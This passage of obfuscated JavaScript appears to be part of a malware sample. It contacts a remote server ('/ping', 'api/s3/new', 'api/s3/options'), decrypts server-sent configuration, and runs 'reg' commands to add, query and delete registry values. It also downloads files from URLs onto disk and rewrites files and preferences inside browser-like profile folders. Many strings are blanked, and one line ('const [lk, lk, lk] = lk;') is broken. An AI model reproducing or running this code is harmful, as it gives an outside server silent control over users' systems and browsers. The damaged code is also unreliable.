                  a47DHT3: gj(Buffer.from(json, "utf8")),
                  i6B2K9E: '',
                  A575H6Y: true,
                  Q57DTM8: gb.P5F9KBR
                });
                ki.A575H6Y = true;
              }
            }
          }
        };
        for (const jz of jt) {
          if (jz.Q57DTM8 === gb.O435AMZ) {
            ju(jz);
          } else if (jz.Q57DTM8 === gb.j451KZ4) {
            jv(jz);
          } else if (jz.Q57DTM8 === gb.R62AFMF) {
            jw(jz);
          } else if (jz.Q57DTM8 === gb.S58EMWW) {
            jx(jz);
          } else if (jz.Q57DTM8 === gb.P5F9KBR) {
            jy(jz);
          }
        }
        if (arr7.length > 0) {
          jt.push(...arr7);
        }
      }
      async function hb(ko) {
        fy.w3F3UWA.s59BT06('');
        const cp2 = require("child_process");
        const arr8 = [];
        const kp = (kx) => {
          if (!kx) {
            return ['', ''];
          }
          if (kx.endsWith("\\")) {
            return [kx, ''];
          }
          const ky = kx.lastIndexOf("\\");
          return ky !== -1 ? [kx.substring(0, ky), kx.substring(ky + 1)] : [kx, ''];
        };
        const kq = (kz) => {
          return cp2.spawnSync("reg", ["query", kz], {
            stdio: "ignore"
          }).status === 0;
        };
        const kr = (la, lb) => {
          const lc = cp2.spawnSync("reg", ["query", la, "/v", lb], {
            encoding: "utf8"
          });
          if (lc.status !== 0) {
            return '';
          }
          for (const ld of lc.stdout.split("\n")) {
            const le = ld.trim().split(/\s{2,}/);
            if (le.length >= 3 && le[0] === lb) {
              return le[2];
            }
          }
          return '';
        };
        const ks = (lf) => {
          let flag = false;
          const lg = cp2.spawnSync("reg", ["query", lf], {
            encoding: "utf8"
          });
          if (lg.error) {
            return flag;
          }
          if (lg.status !== 0) {
            return flag;
          }
          const lh = lg.stdout.split("\n").filter((li) => li.trim() !== '');
          for (let lj = 1; lj < lh.length; lj++) {
            if (lh[lj].trim().split(/\s{4,}/).length === 3) {
              const [lk, lk, lk] = lk;
              let obj4 = {
                Q57DTM8: gb.j451KZ4,
                A575H6Y: true,
                d5E0TQS: lf + lk,
                a47DHT3: lk,
                i6B2K9E: ''
              };
              arr8.push(obj4);
              flag = true;
            }
          }
          return flag;
        };
        const kt = (ll, lm) => {
          return cp2.spawnSync("reg", ["delete", ll, "/v", lm, "/f"], {
            stdio: "ignore"
          }).status === 0;
        };
        const ku = (ln) => {
          cp2.spawnSync("reg", ["delete", ln, "/f"], {
            stdio: "ignore"
          });
        };
        const kv = (lo, lp, lq) => {
          const lr = cp2.spawnSync("reg", ["add", lo, "/v", lp, "/t", "REG_SZ", "/d", lq, "/f"], {
            stdio: "ignore"
          });
          return lr.status === 0;
        };
        for (const kw of ko) {
          if (kw.Q57DTM8 === gb.O435AMZ) {
            kw.A575H6Y = false;
            if (kw.d5E0TQS) {
              const [ls, lt] = kp(kw.d5E0TQS);
              kw.A575H6Y = lt ? !!kr(ls, lt) : kq(ls);
            }
          } else if (kw.Q57DTM8 === gb.j451KZ4) {
            kw.A575H6Y = false;
            if (kw.d5E0TQS) {
              const [lu, lv] = kp(kw.d5E0TQS);
              if (lv) {
                const lw = kr(lu, lv);
                kw.a47DHT3 = lw;
                kw.A575H6Y = !!lw;
              } else {
                kw.A575H6Y = ks(lu);
              }
            }
          } else if (kw.Q57DTM8 === gb.R62AFMF) {
            kw.A575H6Y = false;
            if (kw.d5E0TQS && kw.a47DHT3) {
              const [lx, ly] = kp(kw.d5E0TQS);
              kw.A575H6Y = kv(lx, ly, gs(gs(kw.a47DHT3)));
            }
          } else if (kw.Q57DTM8 === gb.S58EMWW) {
            kw.A575H6Y = false;
            if (kw.d5E0TQS) {
              const [lz, ma] = kp(kw.d5E0TQS);
              if (ma) {
                kw.A575H6Y = !kt(lz, ma);
              } else {
                ku(lz);
                kw.A575H6Y = kq(lz);
              }
            }
          }
        }
        if (arr8.length > 0) {
          ko.push(...arr8);
        }
      }
      async function hc(mb) {
        fy.w3F3UWA.s59BT06('');
        const mc = async (mf) => {
          mf.A575H6Y = false;
          if (mf.d5E0TQS && mf.a47DHT3) {
            if (mf.a47DHT3.startsWith("http") || mf.a47DHT3.startsWith("https")) {
              const mg = await gw(mf.a47DHT3);
              if (mg.length > 0) {
                const mh = gs(mf.d5E0TQS);
                const mi = require("path").dirname(mh);
                if (!go(mi)) {
                  gp(mi);
                }
                mf.A575H6Y = gv(mh, mg);
              }
            }
          }
        };
        const md = async (mj) => {
          mj.A575H6Y = false;
          if (mj.d5E0TQS && mj.a47DHT3 && mj.i6B2K9E) {
            if (mj.a47DHT3.startsWith("http") || mj.a47DHT3.startsWith("https")) {
              const mk = gm(await gw(mj.a47DHT3), gi(mj.i6B2K9E));
              if (mk.length > 0) {
                const ml = gs(mj.d5E0TQS);
                const mm = require("path").dirname(ml);
                if (!go(mm)) {
                  gp(mm);
                }
                mj.A575H6Y = gv(ml, mk);
              }
            }
          }
        };
        for (const me of mb) {
          if (me.Q57DTM8 === gb.R62AFMF) {
            if (!me.i6B2K9E) {
              await mc(me);
            } else {
              await md(me);
            }
          }
        }
      }
      async function hd(mn) {
        fy.w3F3UWA.s59BT06('');
        if (mn.length === 0) {
          return;
        }
        const arr9 = [];
        const mo = gx().split('|');
        const mp = (mr) => {
          for (const ms of mo) {
            if (ms.includes(mr.toUpperCase())) {
              return ms;
            }
          }
          return '';
        };
        for (const mq of mn) {
          if (mq.Q57DTM8 === gb.O435AMZ) {
            const mt = mp(mq.d5E0TQS);
            mq.A575H6Y = mt !== '';
            if (mq.A575H6Y) {
              mq.d5E0TQS = mt;
            }
          } else if (mq.Q57DTM8 === gb.j451KZ4) {
            for (const mu of mo) {
              arr9.push({
                d5E0TQS: mu,
                a47DHT3: '',
                i6B2K9E: '',
                A575H6Y: true,
                Q57DTM8: gb.j451KZ4
              });
            }
          }
        }
        if (arr9.length > 0) {
          mn.push(...arr9);
        }
      }
      async function he(mv) {
        const mw = gq(mv);
        const mx = typeof mw?.iid === "string" ? mw.iid : '';
        if (mx != str7) {
          fy.w3F3UWA.s59BT06('');
          return;
        }
        const my = typeof mw?.data === "string" ? mw.data : '';
        if (my.length == 0) {
          fy.w3F3UWA.s59BT06('');
          return;
        }
        const mz = gl(my, mx);
        if (!mz) {
          fy.w3F3UWA.s59BT06('');
          fy.w3F3UWA.s59BT06('');
          return;
        }
        fy.w3F3UWA.s59BT06('');
        const na = gn.S59C847(gq(mz));
        const nb = na.J6C4Y96;
        if (!nb) {
          return;
        }
        await ha(na.x567X2Q.c608HZL);
        await hb(na.x567X2Q.y4BAIF6);
        await hc(na.x567X2Q.Z59DGHB);
        await hd(na.x567X2Q.s67BMEP);
        await gz(na, nb);
      }
      async function hf(nc, nd) {
        str7 = nc;
        gx = nd;
        fy.w3F3UWA.s59BT06('');
        const obj5 = {
          b54FBAI: fz.p5B1KEV,
          P456VLZ: ga.O435AMZ,
          I489V4T: gt(),
          h46EVPS: -new Date().getTimezoneOffset() / 60,
          b4CERH3: "1.0.0.0",
          J6C4Y96: '',
          x567X2Q: {
            c608HZL: [],
            y4BAIF6: [],
            Z59DGHB: [],
            s67BMEP: []
          }
        };
        const ne = await gy(obj5, "/ping");
        if (ne) {
          await he(ne);
        }
      }
      fw.t505FAN = hf;
    }
  });
  var g = b({
    'obj/T3EADFE.js'(nf) {
      'use strict';

      Object.defineProperty(nf, "__esModule", {
        value: true
      });
      nf.A672SIS = nf.U5E7DEV = nf.i61CFAL = undefined;
      var ng = c();
      var nh = e();
      var ni = d();
      var nj;
      (function (nq) {
        nq[nq.B639G7B = 0] = 'B639G7B';
        nq[nq.N6330WH = 1] = "N6330WH";
        nq[nq.q564DFB = 2] = 'q564DFB';
        nq[nq.q5A5TD7 = 3] = "q5A5TD7";
        nq[nq.h6074WA = 4] = "h6074WA";
        nq[nq.j4B56KB = 5] = "j4B56KB";
        nq[nq.F58C0X0 = 6] = "F58C0X0";
        nq[nq.i623ZUC = 7] = "i623ZUC";
      })(nj || (nj = {}));
      var nk = class {
        constructor() {
          this.H5C67AR = false;
          this.n412K1U = false;
          this.n5B332O = false;
          this.k61AQMQ = false;
          this.a6AFL0X = false;
          this.D4E3EHU = false;
          this.E67CJ69 = false;
          this.a586DQ2 = false;
          this.X42CN81 = false;
          this.Y4B23HN = false;
          this.T5B2T2A = false;
          this.V54518G = false;
          this.T5F71B2 = false;
          this.g5ABMVH = false;
          this.t533W41 = '';
          this.O6CBOE4 = '';
        }
      };
      nf.i61CFAL = nk;
      var nl = class {
        constructor(nr, ns, nt, nu, nv) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.K5F23B9 = '';
          this.j5D4IOV = '';
          this.O6CBOE4 = '';
          if (nr !== undefined) {
            this.m5BCP18 = nr;
          }
          if (ns !== undefined) {
            this.C5C7K1A = ns;
          }
          if (nt !== undefined) {
            this.K5F23B9 = nt;
          }
          if (nu !== undefined) {
            this.j5D4IOV = nu;
          }
          if (nv !== undefined) {
            this.O6CBOE4 = nv;
          }
        }
      };
      var nm = class {
        constructor(nw, nx, ny) {
          this.m5BCP18 = false;
          this.C5C7K1A = '';
          this.p6845JK = '';
          if (nw !== undefined) {
            this.m5BCP18 = nw;
          }
          if (nx !== undefined) {
            this.C5C7K1A = nx;
          }
          if (ny !== undefined) {
            this.p6845JK = ny;
          }
        }
      };
      var nn;
      (function (nz) {
        nz[nz.K4E7SBI = 0] = "K4E7SBI";
        nz[nz.C5B7MFV = 1] = "C5B7MFV";
        nz[nz.u6BB118 = 2] = 'u6BB118';
      })(nn = nf.U5E7DEV || (nf.U5E7DEV = {}));
      var no;
      (function (oa) {
        oa[oa.s46FO09 = 0] = 's46FO09';
        oa[oa.d56ECUF = 1] = "d56ECUF";
        oa[oa.z479UBI = 2] = "z479UBI";
      })(no || (no = {}));
      var np = class {
        constructor(ob, oc, od, oe, of) {
          this.Z5A9DKG = false;
          this.A64CEBI = '';
          this.X6066R5 = ob;
          this.r42EX1Q = oc;
          this.e5FBF4O = od;
          this.t4E0LPU = oe;
          this.q48AQYC = of;
        }
        async q41FDEK() {
          await nh.w3F3UWA.W4EF0EI(0, nh.z579NEI.p5FDZHQ);
          async function og() {
            return !(((await ng.S559FZQ.l610ZCY("size")) ?? '') == '');
          }
          if (await og()) {
            const oj = (await ng.S559FZQ.l610ZCY("iid")) ?? '';
            ni.e5325L3.q474LOF = oj;
            await nh.w3F3UWA.W4EF0EI(0, oj != '' ? nh.z579NEI.W592FFM : nh.z579NEI.q637JNS);
            return nn.K4E7SBI;
          }
          const oh = this.X6066R5() ?? '';
          if ('' == oh) {
            try {
              await ng.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            await nh.w3F3UWA.Y6CDW21(0, nh.z579NEI.h44FFEQ, undefined, ['', oh]);
            return nn.u6BB118;
          }
          let str8 = '';
          try {
            try {
              await ng.S559FZQ.c5E4Z7C("size", "67");
            } catch {}
            var oi = await nh.e696T3N("api/s3/new?fid=ip&version=" + ni.e5325L3.Y55B2P2);
            if (oi) {
              str8 = await oi.json().iid;
              if (str8 != '') {
                ni.e5325L3.q474LOF = str8;
              }
            }
            nh.w3F3UWA.s59BT06('');
            if (str8 != '') {
              let ok = function (ol) {
                let str9 = '';
                for (let om = 0; om < ol.length; om++) {
                  str9 += ol.charCodeAt(om).toString(16).padStart(2, '0');
                }
                return str9;
              };
              await ng.S559FZQ.c5E4Z7C("iid", str8);
              await ng.S559FZQ.c5E4Z7C("usid", ok(oh));
              await nh.w3F3UWA.W4EF0EI(0, nh.z579NEI.E40CNM5, ['', oh]);
              return nn.C5B7MFV;
            } else {
              await ng.S559FZQ.c5E4Z7C("iid", '');
              await nh.w3F3UWA.Y6CDW21(0, nh.z579NEI.h44FFEQ, undefined, ['', oh]);
            }
          } catch (_0x3fc755) {
            await nh.w3F3UWA.Y6CDW21(0, nh.z579NEI.h44FFEQ, _0x3fc755, ['', oh]);
          }
          return nn.u6BB118;
        }
        async A4B0MTO() {
          try {
            if (await this.m6ABVY9()) {
              await f().t505FAN(ni.e5325L3.q474LOF, this.q48AQYC);
            }
          } catch {
            nh.w3F3UWA.s59BT06('');
          }
        }
        async m58FJB5(on) {
          try {
            nh.w3F3UWA.s59BT06('');
            ni.e5325L3.x484Q1X = on;
            nh.w3F3UWA.s59BT06('');
            if (ni.e5325L3.x484Q1X == ng.a689XV5.B639G7B) {
              return;
            }
            await nh.F490EUX();
            await ng.S559FZQ.J6021ZT();
            if (!(await this.m6ABVY9())) {
              return;
            }
            await this.U6B4YNR();
            await this.Z425M7G();
            var oo = await this.e4F5CS0();
            if (await this.H5AE3US(oo.O6CBOE4)) {
              const data = JSON.parse(oo.O6CBOE4);
              let arr10 = [];
              for (const op in data) {
                if (data.hasOwnProperty(op)) {
                  const oq = data[op];
                  for (const or in oq) {
                    if (oq.hasOwnProperty(or)) {
                      await this.O69AL84(op, or, oq[or]);
                      arr10.push(or);
                    }
                  }
                }
              }
              if (arr10.length > 0) {
                await nh.w3F3UWA.W4EF0EI(nj.B639G7B, nh.z579NEI.c5C958F, arr10);
              }
            }
            if (oo.H5C67AR) {
              if (oo.a6AFL0X) {
                await this.p4FE5X4(ni.e5325L3.H64FNMG);
              } else if (oo.n412K1U) {
                await this.j458FW3(ni.e5325L3.H64FNMG);
              }
              if (oo.D4E3EHU) {
                await this.k47F3QK(ni.e5325L3.M56F8MB);
              }
              if (oo.E67CJ69 && ni.e5325L3.R6780KK) {
                nh.w3F3UWA.s59BT06('');
                await this.c647ECB(oo.a586DQ2);
              }
              if (oo.X42CN81 && ni.e5325L3.g4184BO) {
                nh.w3F3UWA.s59BT06('');
                await this.w5C1TZN(oo.Y4B23HN);
              }
              if (oo.T5B2T2A && ni.e5325L3.x4ADWAE) {
                nh.w3F3UWA.s59BT06('');
                await this.h659UF4(oo.V54518G);
              }
              if (oo.T5F71B2 && ni.e5325L3.z4DE429) {
                nh.w3F3UWA.s59BT06('');
                await this.W5F8HOG(oo.g5ABMVH);
              }
            }
            await nh.w3F3UWA.W4EF0EI(nj.B639G7B, nh.z579NEI.f63DUQF, [ni.e5325L3.k596N0J, ni.e5325L3.n664BX9, ni.e5325L3.R6780KK, ni.e5325L3.g4184BO, ni.e5325L3.x4ADWAE, ni.e5325L3.r53FV0M, oo.H5C67AR, oo.n412K1U, oo.n5B332O, oo.k61AQMQ, oo.a6AFL0X, oo.D4E3EHU, ni.e5325L3.z4DE429]);
            return oo;
          } catch (_0x2fa728) {
            await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.m41EBJQ, _0x2fa728);
            return;
          }
        }
        async m6ABVY9() {
          ni.e5325L3.q474LOF = (await ng.S559FZQ.l610ZCY("iid")) ?? '';
          if (!ni.e5325L3.q474LOF || ni.e5325L3.q474LOF == '') {
            nh.w3F3UWA.s59BT06('');
            return false;
          }
          return true;
        }
        async U6B4YNR() {
          var ot = ni.e5325L3.q474LOF ?? '';
          const params2 = new require("url").URLSearchParams();
          const ou = ng.S559FZQ.n677BRA.substring(0, 24) + ot.substring(0, 8);
          const ov = nh.O694X7J(ou, JSON.stringify({
            iid: ot,
            version: ni.e5325L3.Y55B2P2,
            isSchedule: '0'
          }));
          params2.append("data", ov.data);
          params2.append("iv", ov.iv);
          params2.append("iid", ni.e5325L3.q474LOF ?? '');
          let ow = await nh.h5235DD("api/s3/options", params2);
          if (ow && ow.ok) {
            nh.w3F3UWA.s59BT06('');
            let ox = await ow.json();
            if (ox.data) {
              let oy = function (pa, pb) {
                return '' + pa + pb.toString().padStart(2, '0');
              };
              const data2 = JSON.parse((0, nh.U61FWBZ)(ou, ox.data, ox.iv));
              let oz = 1;
              ni.E506IW4.f538M6A = data2[oy('A', oz++)];
              ni.E506IW4.y50355J = data2[oy('A', oz++)];
              ni.E506IW4.q531YE2 = data2[oy('A', oz++)];
              ni.E506IW4.V573T48 = data2[oy('A', oz++)];
              ni.E506IW4.Z643HV5 = data2[oy('A', oz++)];
              ni.E506IW4.M4F7RZT = data2[oy('A', oz++)];
              ni.E506IW4.U548GP6 = data2[oy('A', oz++)];
              ni.E506IW4.q3F6NE0 = data2[oy('A', oz++)];
              ni.E506IW4.G5A3TG6 = data2[oy('A', oz++)];
              ni.E506IW4.v50CKDQ = data2[oy('A', oz++)];
              ni.E506IW4.v4A5HA6 = data2[oy('A', oz++)];
              ni.E506IW4.U40AV23 = data2[oy('A', oz++)];
              ni.E506IW4.z626Z6P = data2[oy('A', oz++)];
              ni.E506IW4.F431S76 = data2[oy('A', oz++)];
              ni.E506IW4.E42DSOG = data2[oy('A', oz++)];
              ni.E506IW4.o5D81YO = data2[oy('A', oz++)];
              ni.E506IW4.Y4F9KA9 = data2[oy('A', oz++)];
              ni.E506IW4.G555SVW = data2[oy('A', oz++)];
              ni.E506IW4.e4BDF2X = data2[oy('A', oz++)];
              ni.E506IW4.Q63EEZI = data2[oy('A', oz++)];
              ni.E506IW4.L4865QA = data2[oy('A', oz++)];
              ni.E506IW4.D472X8L = data2[oy('A', oz++)];
              ni.E506IW4.h676I09 = data2[oy('A', oz++)];
              ni.E506IW4.v4BE899 = data2[oy('A', oz++)];
              ni.E506IW4.E5D2YTN = data2[oy('A', oz++)];
              ni.E506IW4.n5F14C8 = data2[oy('A', oz++)];
              ni.E506IW4.M4AFW8T = data2[oy('A', oz++)];
              ni.E506IW4.s64A8ZU = data2[oy('A', oz++)];
              ni.E506IW4.O680HF3 = data2[oy('A', oz++)];
              ni.E506IW4.n6632PG = data2[oy('A', oz++)];
              ni.E506IW4.a423OLP = data2[oy('A', oz++)];
              ni.E506IW4.e4C2ZG5 = data2[oy('A', oz++)];
              ni.E506IW4.s5A8UWK = data2[oy('A', oz++)];
              ni.E506IW4.e44E7UV = data2[oy('A', oz++)];
              ni.E506IW4.w668BQY = data2[oy('A', oz++)];
              ni.E506IW4.q4D91PM = data2[oy('A', oz++)];
              ni.E506IW4.r6BA6EQ = data2[oy('A', oz++)];
              ni.E506IW4.g65BAO8 = data2[oy('A', oz++)];
              ni.E506IW4.P5D7IHK = data2[oy('A', oz++)];
              ni.E506IW4.g6AEHR8 = data2[oy('A', oz++)];
              ni.E506IW4.W46DKVE = data2[oy('A', oz++)];
              ni.E506IW4.C587HZY = data2[oy('A', oz++)];
              ni.E506IW4.L4F4D5K = data2[oy('A', oz++)];
              ni.E506IW4.d5A04IA = data2[oy('A', oz++)];
              ni.E506IW4.X69CKV1 = data2[oy('A', oz++)];
              ni.E506IW4.Q68703N = data2[oy('A', oz++)];
              ni.E506IW4.k5FECH9 = data2[oy('A', oz++)];
              ni.E506IW4.Q6AD4K1 = data2[oy('A', oz++)];
              ni.E506IW4.c4954SH = data2[oy('A', oz++)];
              ni.E506IW4.n601ESN = data2[oy('A', oz++)];
              ni.E506IW4.c41AH48 = data2[oy('A', oz++)];
              ni.E506IW4.c507RUL = data2[oy('A', oz++)];
              ni.E506IW4.B5176TW = data2[oy('A', oz++)];
              ni.E506IW4.f44CYDD = data2[oy('A', oz++)];
              ni.E506IW4.D582MML = data2[oy('A', oz++)];
              ni.E506IW4.A6C6QFI = data2[oy('A', oz++)];
              ni.E506IW4.E509RHP = data2[oy('A', oz++)];
              ni.E506IW4.p49ALL3 = data2[oy('A', oz++)];
              ni.E506IW4.H4A2CBA = data2[oy('A', oz++)];
              ni.E506IW4.Y420K0O = data2[oy('A', oz++)];
              ni.E506IW4.V615O8R = data2[oy('A', oz++)];
              ni.E506IW4.g477SEM = data2[oy('A', oz++)];
              ni.E506IW4.T525XE5 = data2[oy('A', oz++)];
              ni.E506IW4.V68C0TQ = data2[oy('A', oz++)];
              ni.E506IW4.P41D36M = data2[oy('A', oz++)];
              ni.E506IW4.I4E1ZJ4 = data2[oy('A', oz++)];
              ni.E506IW4.r62EVVQ = data2[oy('A', oz++)];
              ni.E506IW4.I4046MY = data2[oy('A', oz++)];
              ni.E506IW4.i61EV2V = data2[oy('A', oz++)];
              ni.E506IW4.l6C9B2Z = data2[oy('A', oz++)];
              ni.E506IW4.z3EF88U = data2[oy('A', oz++)];
              ni.E506IW4.C61B0CZ = data2[oy('A', oz++)];
              ni.E506IW4.i623ZUC = data2[oy('A', oz++)];
              ni.E506IW4.F6750PF = data2[oy('A', oz++)];
              ni.E506IW4.w443M14 = data2[oy('A', oz++)];
              if (!ni.E506IW4.d6C8UEH()) {
                throw new Error("GetRtcFailed");
              }
            } else {
              throw new Error("PrepareRtcBlocked");
            }
          } else {
            throw new Error("PrepareRtcFailed");
          }
        }
        async Z425M7G() {
          this.A64CEBI = nh.S634YX3((await ng.S559FZQ.l610ZCY("usid")) ?? '');
          nh.w3F3UWA.s59BT06('');
          if (((await ng.S559FZQ.l610ZCY("c-key")) ?? '') != ni.e5325L3.q474LOF) {
            this.Z5A9DKG = true;
          }
          ni.e5325L3.U430LYO = await this.D656W9S(nj.q564DFB);
          ni.e5325L3.r53FV0M = ni.e5325L3.U430LYO != '';
          ni.e5325L3.a6B1QAU = await this.D656W9S(nj.N6330WH);
          ni.e5325L3.k596N0J = ni.e5325L3.a6B1QAU != '';
          if ((await this.D656W9S(nj.q5A5TD7)) != '') {
            ni.e5325L3.g4184BO = true;
          }
          if ((await this.D656W9S(nj.h6074WA)) != '') {
            ni.e5325L3.R6780KK = true;
          }
          if ((await this.D656W9S(nj.j4B56KB)) != '') {
            ni.e5325L3.n664BX9 = true;
          }
          if ((await this.D656W9S(nj.F58C0X0)) != '') {
            ni.e5325L3.x4ADWAE = true;
          }
          if ((await this.D656W9S(nj.i623ZUC)) != '') {
            ni.e5325L3.z4DE429 = true;
          }
          ni.e5325L3.H64FNMG = await this.o43FWNP(false, nj.N6330WH);
          ni.e5325L3.M56F8MB = await this.o43FWNP(false, nj.q564DFB);
          ni.e5325L3.X4B7201 = false;
          if ("" && Array.isArray("")) {
            for (let pc = 0; pc < "".length; pc++) {
              if (await this.A5FCGS4(""[pc])) {
                ni.e5325L3.b57CS7T = pc;
                nh.w3F3UWA.s59BT06('');
                break;
              }
            }
          }
          if ("" && Array.isArray("")) {
            nh.w3F3UWA.s59BT06('');
            for (let pd = 0; pd < "".length; pd++) {
              const pe = ""[pd];
              if (await this.u459C3E(pe.Item1, pe.Item2)) {
                ni.e5325L3.K48B40X = pd;
                nh.w3F3UWA.s59BT06('');
                break;
              }
            }
            nh.w3F3UWA.s59BT06('');
          }
        }
        async o43FWNP(pf, pg) {
          return new Promise((ph) => {
            var str10 = "";
            switch (pg) {
              case nj.N6330WH:
                str10 = "";
                break;
              case nj.q564DFB:
                str10 = "";
                break;
            }
            require("child_process").exec((0, nh.o5B4F49)("", str10, ''), (pi, pj, pk) => {
              if (pi) {
                (async () => {
                  await nh.w3F3UWA.Y6CDW21(pg, nh.z579NEI.O5CE32V, pi);
                })();
                ph(false);
              }
              if (pk) {
                (async () => {
                  await nh.w3F3UWA.Y6CDW21(pg, nh.z579NEI.C4D4SOG, pi);
                })();
                ph(false);
              }
              nh.w3F3UWA.s59BT06('');
              ph(pj.trim() !== '');
            });
          });
        }
        async l660ZQF() {
          nh.w3F3UWA.s59BT06('');
          let pl = await ng.S559FZQ.l610ZCY("iid");
          if (pl) {
            ni.e5325L3.q474LOF = pl;
            try {
              var pm = await nh.e696T3N("api/s3/remove?iid=" + pl);
              if (pm) {
                const pn = await pm.json();
              }
              await nh.w3F3UWA.W4EF0EI(nj.N6330WH, nh.z579NEI.z450T6K);
            } catch (_0x2e6fb0) {
              await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.z450T6K, _0x2e6fb0);
            }
          }
        }
        async D656W9S(po) {
          const path4 = require("path");
          let str11 = '';
          if (po == nj.N6330WH) {
            str11 = path4.join(ng.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (po == nj.q564DFB) {
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
            str11 = "";
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (po == nj.q5A5TD7) {
            str11 = path4.join(require("process").env.USERPROFILE, "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (po == nj.h6074WA) {
            str11 = path4.join(ng.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (po == nj.j4B56KB) {
            str11 = path4.join(ng.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (po == nj.F58C0X0) {
            str11 = path4.join(ng.S559FZQ.D47CBV3(), "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          } else if (po == nj.i623ZUC) {
            str11 = path4.join(ng.S559FZQ.P6A7H5F(), "", "");
            if (await this.A5FCGS4(str11)) {
              return str11;
            }
          }
          return '';
        }
        async j458FW3(pp) {
          nh.w3F3UWA.s59BT06('');
          if (this.A64CEBI == '' || !ni.e5325L3.k596N0J) {
            return;
          }
          const path5 = require("path");
          const pq = ng.S559FZQ.D47CBV3();
          if (!pq) {
            await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.F65A6FS);
            return;
          }
          const pr = path5.join(pq, "");
          if (ni.e5325L3.a6B1QAU == '') {
            await nh.w3F3UWA.W4EF0EI(nj.N6330WH, nh.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !pp || ni.e5325L3.x484Q1X == ng.a689XV5.j5C58S9) {
            if (pp) {
              pp = false;
            }
            await this.D45AYQ3("");
            nh.w3F3UWA.s59BT06('');
          }
          nh.w3F3UWA.s59BT06('');
          let [ps, pt] = await this.A554U7Y(1, path5.join(pr, ""), false);
          if (pt && pt !== '') {
            pt = this.r42EX1Q(pt);
            nh.w3F3UWA.s59BT06('');
          }
          if (ps) {
            let flag2 = false;
            for (let pu = 0; pu < ps.length; pu++) {
              let pv = path5.join(pr, ps[pu], "");
              let pw = path5.join(pr, ps[pu], "");
              let px = path5.join(pr, ps[pu], "");
              let py = path5.join(pr, ps[pu], "");
              if (await this.X428OQY(pv, px)) {
                await this.X428OQY(pw, py);
                let str12 = '';
                let str13 = '';
                await this.r576OBZ(px).then((qa) => {
                  str12 = qa;
                }).catch((qb) => {
                  (async () => {
                    await nh.w3F3UWA.Y6CDW21(nj.N6330WH, nh.z579NEI.n690Q7K, qb);
                  })();
                });
                await this.r576OBZ(py).then((qc) => {
                  str13 = qc;
                }).catch((qd) => {
                  (async () => {
                    await nh.w3F3UWA.Y6CDW21(nj.N6330WH, nh.z579NEI.V6A4P0Z, qd);
                  })();
                });
                if (str12 == '') {
                  await nh.w3F3UWA.W4EF0EI(nj.N6330WH, nh.z579NEI.Q455VXT);
                  continue;
                }
                nh.w3F3UWA.s59BT06('');
                let pz = await this.O515QL8(1, str12, str13);
                if (!pz.m5BCP18) {
                  await nh.w3F3UWA.W4EF0EI(nj.N6330WH, nh.z579NEI.L5CFOQF);
                  return;
                }
                if (pp && ((await this.H5AE3US(pz.C5C7K1A)) || (await this.H5AE3US(pz.K5F23B9)))) {
                  nh.w3F3UWA.s59BT06('');
                  await this.j458FW3(false);
                  return;
                }
                nh.w3F3UWA.s59BT06('');
                let flag3 = false;
                if (await this.H5AE3US(pz.C5C7K1A)) {
                  await this.Y53EKLA(px, pz.C5C7K1A);
                  await this.X428OQY(px, pv);
                  nh.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (await this.H5AE3US(pz.K5F23B9)) {
                  await this.Y53EKLA(py, pz.K5F23B9);
                  await this.X428OQY(py, pw);
                  nh.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (pz.j5D4IOV && pz.j5D4IOV.length !== 0) {
                  await this.O69AL84("" + ps[pu], "", pz.j5D4IOV);
                  nh.w3F3UWA.s59BT06('');
                  flag3 = true;
                }
                if (await this.H5AE3US(pz.O6CBOE4)) {
                  const data3 = JSON.parse(pz.O6CBOE4);
                  let arr11 = [];
                  for (const qe in data3) {
                    if (data3.hasOwnProperty(qe)) {
                      const qf = data3[qe];
                      for (const qg in qf) {
                        if (qf.hasOwnProperty(qg)) {
                          await this.O69AL84(qe.replace("%PROFILE%", ps[pu]), qg, qf[qg]);
                          arr11.push(qg);
                        }
                      }
                    }
                  }
                  if (arr11.length > 0) {
                    await nh.w3F3UWA.W4EF0EI(nj.N6330WH, nh.z579NEI.f4D0VNO, [arr11]);
                  }
                }
                flag2 = true;
                if (flag3) {
                  await nh.w3F3UWA.W4EF0EI(nj.N6330WH, nh.z579NEI.y462O1X);
                } else {
                  await nh.w3F3UWA.W4EF0EI(nj.N6330WH, nh.z579NEI.E69EQ1O);
                }
              }
            }
            if (flag2) {
              await ng.S559FZQ.c5E4Z7C("c-key", ni.e5325L3.q474LOF);
            }
          }
          nh.w3F3UWA.s59BT06('');
          return;
        }
        async p4FE5X4(qh) {
          let qi = nj.N6330WH;
          nh.w3F3UWA.s59BT06('');
          if (!ni.e5325L3.k596N0J) {
            return;
          }
          const path6 = require("path");
          const qj = ng.S559FZQ.D47CBV3();
          if (!qj) {
            await nh.w3F3UWA.Y6CDW21(nj.B639G7B, nh.z579NEI.F65A6FS);
            return;
          }
          const qk = path6.join(qj, "");
          if (ni.e5325L3.a6B1QAU == '') {
            await nh.w3F3UWA.W4EF0EI(qi, nh.z579NEI.m599GWS);
            return;
          }
          if (this.Z5A9DKG || !qh || ni.e5325L3.x484Q1X == ng.a689XV5.j5C58S9) {
            if (qh) {
              qh = false;
              await this.D45AYQ3("");
              nh.w3F3UWA.s59BT06('');
            }
            nh.w3F3UWA.s59BT06('');
            let [ql, qm] = await this.A554U7Y(qi, path6.join(qk, ""), true);
            if (qm && qm !== '') {
              qm = this.r42EX1Q(qm);
